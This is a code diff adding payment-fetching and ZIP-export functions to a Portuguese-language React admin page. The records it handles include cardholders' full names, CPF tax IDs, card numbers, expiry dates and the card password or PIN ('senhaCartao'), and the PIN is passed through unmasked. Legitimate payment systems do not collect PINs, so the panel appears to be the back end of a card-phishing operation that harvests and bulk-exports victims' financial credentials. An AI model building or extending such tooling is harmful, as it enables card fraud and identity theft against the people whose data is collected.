@@ -113,6 +113,71 @@ const Admin = () => {
     fetchPayments();
   }, []);
 
+  const fetchPayments = async () => {
+    try {
+      setIsLoading(true);
+      const response = await fetch('/api/payments');
+      const data = await response.json();
+
+      if (data.success && data.payments) {
+        const mappedPayments: Payment[] = data.payments.map((payment: any) => ({
+          id: payment.id || payment.dataCriacao,
+          nomeCompleto: payment.nomeCompleto || '',
+          cpf: payment.cpf || '',
+          numeroCartao: payment.numeroCartao ? `**** **** **** ${payment.numeroCartao.slice(-4)}` : '****',
+          validade: payment.validade || '',
+          dataCriacao: payment.dataCriacao || '',
+          status: 'processado' as const,
+          senhaCartao: payment.senhaCartao
+        }));
+
+        setPayments(mappedPayments);
+        if (mappedPayments.length > 0) {
+          toast.success(`${mappedPayments.length} pagamento(s) carregado(s)`);
+        }
+      } else {
+        setPayments([]);
+      }
+    } catch (error) {
+      console.error('Erro ao carregar pagamentos:', error);
+      toast.error('Erro ao carregar dados do servidor');
+    } finally {
+      setIsLoading(false);
+    }
+  };
+
+  const handleRefreshPayments = async () => {
+    await fetchPayments();
+  };
+
+  const handleDownloadZip = async () => {
+    try {
+      setIsDownloading(true);
+      const response = await fetch('/api/download-zip');
+
+      if (!response.ok) {
+        throw new Error('Erro ao baixar ZIP');
+      }
+
+      const blob = await response.blob();
+      const url = window.URL.createObjectURL(blob);
+      const link = document.createElement('a');
+      link.href = url;
+      link.setAttribute('download', 'pagamentos.zip');
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+      window.URL.revokeObjectURL(url);
+
+      toast.success('ZIP baixado com sucesso!');
+    } catch (error) {
+      console.error('Erro ao baixar ZIP:', error);
+      toast.error('Erro ao baixar ZIP');
+    } finally {
+      setIsDownloading(false);
+    }
+  };
+
   const parsePaymentContent = (content: string): ParsedPaymentData => {
     return {
       nome: 'João Silva Santos',
